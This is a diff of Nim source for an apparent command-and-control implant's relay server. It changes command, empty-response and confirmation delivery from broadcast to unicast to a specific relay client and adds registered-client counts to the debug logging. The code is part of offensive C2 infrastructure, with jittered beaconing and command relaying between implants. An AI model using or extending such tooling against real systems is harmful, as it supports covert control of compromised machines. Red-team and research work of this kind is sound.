@@ -16,7 +16,7 @@ import core/cmdParser
 import core/relay/[relay_protocol, relay_comm, relay_config]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
-from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage
+from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
 # Removed unused threadpool and locks imports
 
 # Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
@@ -620,6 +620,7 @@ proc httpHandler() {.async.} =
                                         $responseData
                                     )
                                     
+                                    # REGISTRATION: Use broadcast (clients don't have final IDs yet)
                                     let stats = relay_commands.getConnectionStats(g_relayServer)
                                     if stats.connections > 0:
                                         discard broadcastMessage(g_relayServer, idMsg)
@@ -744,12 +745,14 @@ proc httpHandler() {.async.} =
                                     $commandPayload
                                 )
                                 
-                                # Send command to relay client
-                                let stats = relay_commands.getConnectionStats(g_relayServer)
-                                if stats.connections > 0:
-                                    discard broadcastMessage(g_relayServer, cmdMsg)
+                                # Send command to SPECIFIC relay client (unicast)
+                                let success = sendToClient(g_relayServer, msg.fromID, cmdMsg)
+                                if success:
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to " & $stats.connections & " relay clients"
+                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to specific client: " & msg.fromID
+                                else:
+                                    when defined debug:
+                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send command to client: " & msg.fromID
                             else:
                                 # NO COMMANDS or CONNECTION ERROR - Still send a response!
                                 when defined debug:
@@ -765,11 +768,14 @@ proc httpHandler() {.async.} =
                                     "NO_COMMANDS"
                                 )
                                 
-                                let stats = relay_commands.getConnectionStats(g_relayServer)
-                                if stats.connections > 0:
-                                    discard broadcastMessage(g_relayServer, emptyResponse)
+                                # Send empty response to SPECIFIC relay client (unicast)
+                                let success = sendToClient(g_relayServer, msg.fromID, emptyResponse)
+                                if success:
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to relay client (PULL completed)"
+                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to specific client: " & msg.fromID & " (PULL completed)"
+                                else:
+                                    when defined debug:
+                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send empty response to client: " & msg.fromID
                         
                         of RESPONSE:
                             when defined debug:
@@ -856,14 +862,14 @@ proc httpHandler() {.async.} =
                                 "RESULT_SENT_TO_C2"
                             )
                             
-                            let stats = relay_commands.getConnectionStats(g_relayServer)
-                            if stats.connections > 0:
-                                discard broadcastMessage(g_relayServer, confirmMsg)
+                            # Send confirmation to SPECIFIC relay client (unicast)
+                            let success = sendToClient(g_relayServer, msg.fromID, confirmMsg)
+                            if success:
                                 when defined debug:
-                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to relay client"
+                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to specific client: " & msg.fromID
                             else:
                                 when defined debug:
-                                    echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send confirmation to"
+                                    echo "[DEBUG] 🌐 HTTP Handler: ⚠️  Failed to send confirmation to client: " & msg.fromID
                         
                         of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                             when defined debug:
@@ -877,7 +883,7 @@ proc httpHandler() {.async.} =
                     echo ""
                     echo "┌─ 📡 END RELAY SERVER POLLING CYCLE"
                     let finalStats = relay_commands.getConnectionStats(g_relayServer)
-                    echo "├─ Processed: " & $messageCount & " messages │ Active connections: " & $finalStats.connections
+                    echo "├─ Processed: " & $messageCount & " messages │ Connections: " & $finalStats.connections & " │ Registered: " & $finalStats.registeredClients
                     echo "└─────────────────────────────────────────────────────────"
                     echo ""
             
@@ -921,7 +927,7 @@ proc httpHandler() {.async.} =
             
             # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
             let connectionStats = relay_commands.getConnectionStats(g_relayServer)
-            let sleepMs = if g_relayServer.isListening and connectionStats.connections > 0:
+            let sleepMs = if g_relayServer.isListening and connectionStats.registeredClients > 0:
                 # ADAPTIVE timing when relay clients are connected - adjust based on network health
                 let baseTime = if g_serverFastMode: 500 else: 1000
                 let adaptiveTime = int(float(baseTime) * g_networkHealth.adaptiveMultiplier)
@@ -949,7 +955,7 @@ proc httpHandler() {.async.} =
                      $g_serverFastMode & ", base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
                 echo "[DEBUG] 🌐 HTTP Handler: Timing decision analysis:"
                 echo "[DEBUG] 🌐 HTTP Handler: - Relay server listening: " & $g_relayServer.isListening
-                echo "[DEBUG] 🌐 HTTP Handler: - Connected relay clients: " & $connectionStats.connections
+                echo "[DEBUG] 🌐 HTTP Handler: - Total connections: " & $connectionStats.connections & ", Registered clients: " & $connectionStats.registeredClients
                 echo "[DEBUG] 🌐 HTTP Handler: - Server fast mode: " & $g_serverFastMode
                 echo "[DEBUG] 🌐 HTTP Handler: - Adaptive max sleep: " & $g_adaptiveMaxSleep & "ms"
                 echo "[DEBUG] 🌐 HTTP Handler: - Original listener sleep time: " & $listener.sleepTime & "s"
